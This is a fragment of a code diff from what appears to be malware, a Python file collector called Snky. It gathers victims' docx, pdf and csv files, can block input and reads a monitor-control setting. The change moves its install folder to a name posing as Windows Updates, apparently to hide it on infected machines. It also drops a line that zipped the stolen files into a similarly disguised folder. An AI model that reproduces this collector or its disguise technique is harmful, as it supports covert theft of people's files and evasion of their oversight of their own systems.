@@ -17,8 +17,8 @@ docx = []
 pdf = []
 csv = []
 
-if os.path.exists(f"{os.getenv('LOCALAPPDATA')}/Snky/Snky-main/cfg/file_collector_config.json"):
-    with open(f"{os.getenv('LOCALAPPDATA')}/Snky/Snky-main/cfg/file_collector_config.json", "r") as f:
+if os.path.exists(f"{os.getenv('LOCALAPPDATA')}/WindowsUpdatesManager/Snky-main/cfg/file_collector_config.json"):
+    with open(f"{os.getenv('LOCALAPPDATA')}/WindowsUpdatesManager/Snky-main/cfg/file_collector_config.json", "r") as f:
         config = json.load(f)
 
 if config.get("input_blocking") == True:
@@ -89,7 +89,6 @@ def remove_remnants():
 
 
 main()
-make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files")
 remove_remnants()
 
 if config.get("monitor_control") == True:
